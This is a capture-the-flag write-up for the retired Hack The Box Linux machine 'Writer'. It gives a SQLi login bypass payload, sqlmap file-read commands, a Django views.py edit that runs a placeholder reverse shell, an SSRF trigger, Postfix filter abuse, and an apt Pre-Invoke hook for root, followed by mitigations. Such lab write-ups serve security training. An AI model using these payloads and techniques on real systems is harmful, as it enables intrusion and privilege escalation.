---
machine: Writer
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, sqli, auth-bypass, file-read, ssrf, samba, django, postfix, apt, privesc]
---

# Writer — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `/administrative` panel is vulnerable to SQLi: `admin' or 1=1-- -` bypasses the login and a UNION injection with the `FILE` privilege reads system files. The source code and `/etc/samba/smb.conf` reveal database credentials and the `writer2_project` share, reachable over SMB as `kyle`. The share is writable and holds the Django project served on internal port `8080`. `views.py` is modified to run a reverse shell and triggered through the story form's SSRF. The shell is `www-data`. The Django hash is cracked to reach `kyle`; their `filter` group allows writing the Postfix filter, which runs as `john`, and the `management` group grants write access to `/etc/apt/apt.conf.d`, where a `Pre-Invoke` runs as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,139,445 <IP>
```

- `22`: OpenSSH.
- `80`: nginx with the application.
- `139`/`445`: Samba.

```bash
echo '<IP> writer.htb' | sudo tee -a /etc/hosts
```

## Enumeration

The `/administrative` panel and the story form are the entry points. Samba publishes `writer2_project`, and the project code is served on internal port `8080`.

## Foothold

The `/administrative` login concatenates the fields into the query. The bypass is direct:

```text
uname=admin' or 1=1-- -&password=x
```

Inside the panel, the story form can load an image from a URL. It is an SSRF. The same SQLi, with a database user holding `FILE`, reads files:

```bash
sqlmap -r login.req --file-read=/etc/passwd
sqlmap -r login.req --file-read=/etc/samba/smb.conf
```

The project source contains database credentials; the password is reused for `kyle` over SMB. The `writer2_project` share is writable.

## Lateral movement

The share contains the Django project served on internal port `8080`. `views.py` is modified to run a command:

```python
import os
def home_page(request):
    os.system('<REVERSE_SHELL>')
```

Upload it over SMB and trigger it through the SSRF; the URL must contain `.jpg` to pass the filter:

```text
http://127.0.0.1:8080/?.jpg
```

The shell is `www-data`. The Django database holds a hash; cracking it gives `kyle`'s password.

## Privilege escalation

`kyle` is in the `filter` and `smbgroup` groups and can write `/etc/postfix/disclaimer`. Postfix runs that script as `john` for each email; an SSH key is added, a message is sent to `localhost:25`, and `john` is obtained. The script is restored every minute, so it must be written and the email sent immediately.

```bash
ssh -L 25:127.0.0.1:25 kyle@writer.htb
swaks --to irc@writer.htb --from kyle@writer.htb --server 127.0.0.1 --body test
```

`john` belongs to the `management` group, which can write to `/etc/apt/apt.conf.d`.

Root is obtained through `apt`. A configuration file is created with a `Pre-Invoke`:

```text
apt::Update::Pre-Invoke { "<REVERSE_SHELL>"; };
```

The update cron runs `apt-get update` as root, fires the `Pre-Invoke` and returns a root shell.

## Evidence

- Login bypass with `admin' or 1=1-- -`.
- File reads through SQLi and Samba credentials.
- Access to `writer2_project`, edited `views.py` and SSRF.
- `www-data` shell and a cracked Django hash.
- Postfix filter as `john` and writable `apt.conf.d`.
- `Pre-Invoke` executed by the apt cron as root.

## Lessons learned

- SQLi at login can be combined with `FILE` to read the system.
- Application credentials get reused in SMB and the OS.
- A writable share serving application code is RCE.
- Mail filters run scripts under the configured account.
- A group with write access to `apt.conf.d` allows root execution.
- The SSRF is triggered with a path that satisfies the extension filter.

## Mitigations and detection

- Parameterize queries and limit the database user's `FILE` privilege.
- Do not reuse passwords across application, SMB and the OS.
- Keep code out of shared directories and restrict SMB writes.
- Review Postfix filters and run them with least privilege.
- Restrict writes to `/etc/apt/apt.conf.d` and review `Pre-Invoke`.
- Monitor `views.py` edits, filter emails and `apt-get update` executions.

## References

- [0xdf — Writer](https://0xdf.gitlab.io/2021/12/11/htb-writer.html)
- [Hack The Box — Writer](https://app.hackthebox.com/machines/writer)
